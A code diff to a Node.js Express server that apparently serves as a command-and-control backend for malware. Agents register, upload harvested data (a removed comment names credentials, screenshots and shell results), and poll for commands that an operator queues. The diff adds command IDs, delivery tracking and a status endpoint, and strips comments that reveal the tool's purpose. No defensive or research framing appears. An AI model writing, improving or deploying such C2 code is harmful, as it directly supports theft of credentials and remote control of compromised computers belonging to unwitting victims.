@@ -10,6 +10,7 @@ app.use(bodyParser.json({ limit: '50mb' }));
 // In-memory storage
 const agents = new Map();
 const responses = new Map(); // agent_id -> [responses]
+const commands = new Map();  // agent_id -> [{id, data, pending}]
 
 // Health check
 app.get('/', (req, res) => {
@@ -25,7 +26,7 @@ app.post('/api/register', (req, res) => {
     res.json({ success: true, id });
 });
 
-// Agent sends data (credentials, screenshot, shell result, etc.)
+// Agent sends data
 app.post('/api/data/:agentId', (req, res) => {
     const { agentId } = req.params;
     const data = req.body;
@@ -45,7 +46,6 @@ app.post('/api/data/:agentId', (req, res) => {
         agentResponses.shift();
     }
 
-    // Update last seen
     if (agents.has(agentId)) {
         agents.get(agentId).last_seen = new Date().toISOString();
     }
@@ -54,7 +54,7 @@ app.post('/api/data/:agentId', (req, res) => {
     res.json({ success: true });
 });
 
-// Admin fetches all data for an agent
+// Admin fetches data for an agent
 app.get('/api/data/:agentId', (req, res) => {
     const { agentId } = req.params;
     const data = responses.get(agentId) || [];
@@ -71,23 +71,40 @@ app.get('/api/agents', (req, res) => {
 app.post('/api/command/:agentId', (req, res) => {
     const { agentId } = req.params;
     const cmd = req.body;
-    // Store command for agent to pick up
-    if (!responses.has(`cmd_${agentId}`)) {
-        responses.set(`cmd_${agentId}`, []);
+    const cmdId = uuidv4();
+
+    if (!commands.has(agentId)) {
+        commands.set(agentId, []);
     }
-    responses.get(`cmd_${agentId}`).push({
-        ...cmd,
+
+    commands.get(agentId).push({
+        id: cmdId,
+        data: cmd,
+        pending: true,
         timestamp: new Date().toISOString()
     });
-    res.json({ success: true });
+
+    console.log(`[COMMAND] ${cmd.type} -> ${agentId} (${cmdId})`);
+    res.json({ success: true, id: cmdId });
 });
 
-// Agent polls for commands
+// Agent polls for commands (marks as delivered but doesn't delete)
 app.get('/api/commands/:agentId', (req, res) => {
     const { agentId } = req.params;
-    const cmds = responses.get(`cmd_${agentId}`) || [];
-    responses.set(`cmd_${agentId}`, []); // Clear after fetching
-    res.json(cmds);
+    const cmds = commands.get(agentId) || [];
+
+    // Return pending commands and mark them as delivered
+    const pending = cmds.filter(c => c.pending);
+    cmds.forEach(c => { c.pending = false; });
+
+    res.json(pending.map(c => c.data));
+});
+
+// Command status check
+app.get('/api/command-status/:agentId', (req, res) => {
+    const { agentId } = req.params;
+    const cmds = commands.get(agentId) || [];
+    res.json(cmds.map(c => ({ id: c.id, type: c.data.type, pending: c.pending, timestamp: c.timestamp })));
 });
 
 const PORT = process.env.PORT || 10000;
